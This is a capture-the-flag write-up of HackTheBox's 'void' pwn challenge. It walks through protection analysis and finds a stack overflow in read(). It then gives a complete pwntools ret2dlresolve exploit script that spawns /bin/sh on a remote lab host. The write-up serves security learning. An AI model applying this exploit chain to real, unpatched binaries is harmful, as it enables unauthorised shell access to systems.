# Day18 - void

- **Platform**: HackTheBox  
- **Category**: Pwn  
- **Difficulty**: Hard  
- **Date**: 2025-05-18  
- **Tools Used**: pwntools, GDB, checksec  

---

## Summary
The `void` binary was a non-PIE, NX-enabled program with partial RELRO and no stack canary. Exploiting a vulnerable `read()` call, I built a ret2dlresolve ROP chain to dynamically resolve and call `system("/bin/sh")`, gaining a shell and retrieving the flag.

---

## Enumeration
- Provided files:  
  - `void` (binary)  
  - `glibc` folder with custom libc and loader  
  - `flag.txt` (dummy)  

- Behavior:  
  - Running `./void` or connecting with `nc` produced no output.  
  - Disassembly showed `main()` directly calling `vuln()`.  

- Vulnerability:  
  - In `vuln()`, a 64-byte stack buffer was overrun by:
    ```c
    read(fd=0, buf, 200);
    ```
  - Protections (via `checksec`):  
    - Partial RELRO → GOT partly writable  
    - No canary → stack overflow possible  
    - NX enabled → stack non-executable  
    - No PIE → fixed addresses for ROP  

---

## Exploitation
1. **Offset Discovery**  
   - Generated cyclic pattern in GDB.  
   - Found RIP offset = 72 bytes.  

2. **ROP Payload**  
   - Crafted ret2dlresolve exploit targeting `system("/bin/sh")`:  
     ```python
     from pwn import *

     void = ELF("void")
     libc = ELF("glibc/libc.so.6")
     ld   = ELF("glibc/ld-linux-x86-64.so.2")
     context.binary = void.path

     rop = ROP(void)
     resolver = Ret2dlresolvePayload(void, symbol="system", args=["/bin/sh"])

     rop.read(0, resolver.data_addr)
     rop.raw(rop.ret[0])
     rop.ret2dlresolve(resolver)
     chain = rop.chain()

     p = remote("83.136.250.158", 39848)
     p.sendline(b"A"*72 + chain)
     p.sendline(resolver.payload)
     p.interactive()
     ```
   - Used `read()` to stage the resolver structures, then invoked ret2dlresolve.  

3. **Execution**  
   - Ran exploit script, obtained a shell.  
   - Navigated the filesystem and read `/root/flag.txt`.  

---

## Lessons Learned
- **ret2dlresolve**: bypasses restrictions by dynamically resolving libc functions at runtime.  
- **ROP chaining**: combine gadgets to call functions like `read()` and control program flow.  
- **Protections analysis**: knowing which defenses (NX, RELRO, PIE, canary) are enabled dictates exploitation strategy.  
- **Offset calculation**: GDB cyclic patterns are the fastest way to determine buffer overflow offsets.  
